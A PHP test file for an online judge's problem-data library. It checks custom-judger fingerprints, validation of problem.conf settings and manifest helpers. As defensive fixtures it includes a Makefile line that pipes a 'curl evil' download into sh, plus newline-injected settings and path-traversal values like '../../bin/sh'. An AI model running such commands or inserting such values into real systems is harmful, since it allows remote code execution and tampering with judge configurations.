<?php

require_once __DIR__ . '/../app/libs/uoj-validate-lib.php';
require_once __DIR__ . '/../app/libs/uoj-judger-lib.php';
require_once __DIR__ . '/../app/libs/uoj-data-lib.php';

// builds an upload folder of a problem with a custom judger and returns its fingerprint
function fingerprint_of($files, $conf) {
	$dir = sys_get_temp_dir() . '/uoj_fingerprint_test_' . getmypid();
	exec('rm -rf ' . escapeshellarg($dir));
	mkdir("$dir/require", 0755, true);
	foreach ($files as $name => $content) {
		file_put_contents("$dir/$name", $content);
	}
	$fingerprint = dataCustomJudgerFingerprint($dir, $conf);
	exec('rm -rf ' . escapeshellarg($dir));
	return $fingerprint;
}

$files = [
	'problem.conf' => "use_builtin_judger off\n",
	'Makefile' => "all: judger std val\n",
	'judger.cpp' => "int main() {}\n",
	'std.cpp' => "int main() {}\n",
	'require/lib.h' => "// lib\n",
	'input1.txt' => "1 2\n",
	'output1.txt' => "3\n",
	'ex_input1.txt' => "2 3\n",
	'ex_output1.txt' => "5\n",
];
$conf = ['use_builtin_judger' => 'off', 'n_tests' => '1', 'n_ex_tests' => '1', 'time_limit' => '1'];
$approved = fingerprint_of($files, $conf);

check_same(64, strlen($approved), 'the fingerprint is a SHA256');
check_same($approved, fingerprint_of($files, $conf), 'the fingerprint is stable');
check_same($approved, fingerprint_of($files, array_reverse($conf, true)), 'the order of problem.conf does not matter');

// what a successful hack does: one more extra test
$hacked = $files + ['ex_input2.txt' => "\x00\xff\r\n", 'ex_output2.txt' => "9\n"];
$hacked_conf = ['n_ex_tests' => 2] + $conf;
check_same($approved, fingerprint_of($hacked, $hacked_conf), 'a new extra test keeps the fingerprint');
check_same($approved, fingerprint_of(['ex_input1.txt' => "7 7\n"] + $files, $conf), 'the content of an extra test does not matter');

// everything else has to be approved again
$changed = function($files, $conf) use ($approved) {
	return fingerprint_of($files, $conf) !== $approved;
};
check_same(true, $changed(['Makefile' => "all:\n\tcurl evil | sh\n"] + $files, $conf), 'a changed Makefile');
check_same(true, $changed(['judger.cpp' => "int main() { return 1; }\n"] + $files, $conf), 'a changed judger');
check_same(true, $changed(['require/lib.h' => "// evil\n"] + $files, $conf), 'a changed file in a subfolder');
check_same(true, $changed(['input1.txt' => "5 5\n"] + $files, $conf), 'a changed main test');
check_same(true, $changed($files + ['helper.sh' => "#!/bin/sh\n"], $conf), 'a new file');
check_same(true, $changed($files + ['ex_input2.txt' => "1\n"], $conf), 'a file named like an extra test that is not one');
check_same(true, $changed($files, ['time_limit' => '100'] + $conf), 'a changed limit');
check_same(true, $changed($files, $conf + ['input_suf' => 'cpp']), 'a changed file name pattern');
check_same(true, $changed(array_diff_key($files, ['std.cpp' => 0]), $conf), 'a removed file');

// problem.conf built from the settings form
$settings = [
	'use_builtin_checker' => 'ncmp', 'n_tests' => '10', 'n_ex_tests' => '', 'n_sample_tests' => '2',
	'input_pre' => 'data', 'input_suf' => 'in', 'output_pre' => 'data', 'output_suf' => 'out',
	'time_limit' => '1', 'memory_limit' => '256',
];
check_same([
	'use_builtin_judger' => 'on', 'use_builtin_checker' => 'ncmp', 'n_tests' => '10', 'n_ex_tests' => '0', 'n_sample_tests' => '2',
	'input_pre' => 'data', 'input_suf' => 'in', 'output_pre' => 'data', 'output_suf' => 'out',
	'time_limit' => '1', 'memory_limit' => '256',
], dataProblemConfFromSettings($settings), 'settings of an ordinary problem');
check_same(false, isset(dataProblemConfFromSettings(['use_builtin_checker' => 'ownchk'] + $settings)['use_builtin_checker']), 'a custom checker');
check_same('0.5', dataProblemConfFromSettings(['time_limit' => '0.5'] + $settings)['time_limit'], 'a fractional time limit');

$invalid = [
	'a line break adds a setting' => ['input_pre' => "data\nuse_builtin_judger off"],
	'a space adds a value' => ['output_suf' => 'out extra'],
	'a carriage return' => ['memory_limit' => "256\rtime_limit 100"],
	'a checker with a path' => ['use_builtin_checker' => '../../bin/sh'],
	'a file name with a path' => ['input_pre' => '../data'],
	'no tests' => ['n_tests' => '0'],
	'a negative number of tests' => ['n_tests' => '-1'],
	'a missing value' => ['input_suf' => ''],
	'an array instead of a value' => ['time_limit' => ['1']],
	'a time limit that is not a number' => ['time_limit' => '1s'],
	'no time limit' => ['time_limit' => '0'],
	'a memory limit that is not a number' => ['memory_limit' => '256MB'],
];
foreach ($invalid as $what => $override) {
	check_same(null, dataProblemConfFromSettings($override + $settings), $what);
}

// the files of a version of the data of a problem
$dir = sys_get_temp_dir() . '/uoj_manifest_test_' . getmypid();
exec('rm -rf ' . escapeshellarg($dir));
mkdir("$dir/require", 0755, true);
file_put_contents("$dir/problem.conf", "n_tests 1\n");
file_put_contents("$dir/input1.txt", "1 2\n");
file_put_contents("$dir/require/lib.h", "");
check_same([
	'input1.txt' => [4, hash('sha256', "1 2\n")],
	'problem.conf' => [10, hash('sha256', "n_tests 1\n")],
	'require/lib.h' => [0, hash('sha256', '')],
], dataManifest($dir), 'the manifest of a folder');
exec('rm -rf ' . escapeshellarg($dir));

check_same('/var/uoj_data/prepare_7', dataStageDir(7), 'the staging folder of a problem');
check_same('/var/uoj_data/archive/7/3.zip', dataArchivePath(7, 3), 'the archive of an old version');
